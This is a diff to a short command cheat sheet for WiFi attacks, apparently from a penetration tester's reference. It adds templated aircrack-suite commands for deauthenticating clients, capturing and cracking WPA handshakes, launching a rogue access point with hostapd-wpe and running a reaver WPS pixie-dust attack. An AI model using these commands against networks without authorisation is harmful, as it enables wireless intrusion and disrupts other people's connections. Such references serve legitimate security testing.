@@ -1,25 +1,40 @@
 # wifi
 
-#plateform/linux #target/remote #cat/RECON #cat/ATTACK #tag/powershell 
+#plateform/linux #target/remote #cat/RECON #cat/ATTACK
+
+## airmon - Kill processes which can cause trouble
+```
+airmon-ng check kill
+```
 
 ## airmon - start interface
 ```
-airmon-ng start wlan0
+airmon-ng start <wlan_interface>
+```
+
+## airmon - stop interface
+```
+airmon-ng stop <wlanmon_interface>
+```
+
+## NetworkManager - Restart NetworkManager
+```
+systemctl restart NetworkManager
 ```
 
 ## airodump - listen to everything
 ```
-airodump-ng wlan0mon
+airodump-ng <wlanmon_interface>
 ```
 
 ## airodump - listen to specific SSID
 ```
-airodump-ng --bssid <mac_address> -c <channel> -w <output_file> wlan0mon
+airodump-ng --bssid <mac_address> -c <channel> -w <output_file> <wlanmon_interface>
 ```
 
-## aireplay - deauth clients
+## aireplay - deauth client
 ```
-aireplay-ng --deauth 5 -c <client_mac_address> -a <mac_address> wlan0mon
+aireplay-ng --deauth <deauth_count> -c <client_mac_address> -a <mac_address> <wlanmon_interface>
 ```
 
 ## aircrack - crack handshake for PSK
@@ -29,5 +44,25 @@ aircrack-ng -w <dictionary> <input_file>
 
 ## hostapd-wpe - launch fake AP
 ```
-hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+hostapd-wpe <hostapd_conf>
 ```
+
+## kismet - monitor WiFi
+```
+kismet -c <wlan_interface>
+```
+
+## nmcli - set back WiFi interface to managed mode
+```
+nmcli device set <wlan_interface> managed true
+```
+
+## reaver - launch WPS pixiedust attack
+```
+reaver -i <wlanmon_interface> -b <mac_address> -c <channel> -Z
+```
+
+= wlan_interface: wlan0
+= wlanmon_interface: wlan0mon
+= deauth_count: 5
+= hostapd_conf: /etc/hostapd-wpe/hostapd-wpe.conf
